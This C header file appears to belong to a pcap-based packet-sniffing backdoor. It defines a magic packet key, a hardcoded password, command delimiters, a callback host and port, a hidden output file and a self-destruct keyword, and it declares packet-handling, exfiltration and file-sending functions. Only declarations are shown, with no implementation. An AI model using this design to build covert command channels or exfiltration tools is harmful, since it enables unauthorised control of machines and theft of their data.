#ifndef PKTHANDLER_H
#define PKTHANDLER_H

#define ETHER_IP_UDP_LEN 42
#define MAX_SIZE 1024
#define BACKDOOR_HEADER_KEY "pkt"
#define BACKDOOR_HEADER_LEN 3
#define PASSWORD "987"
#define PASSLEN 3
#define COMMAND_START "start["
#define COMMAND_END "]end"
#define PORT 80
#define HOST "192.168.0.101"
#define BUFMAX 1024
#define FNAME ".output"
#define SELFDESTRUCT "impload"
#define BDNAME "bd"

void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info,const u_char *packet);
void exfil();
int SendFile(char *filename, int sd);

#endif
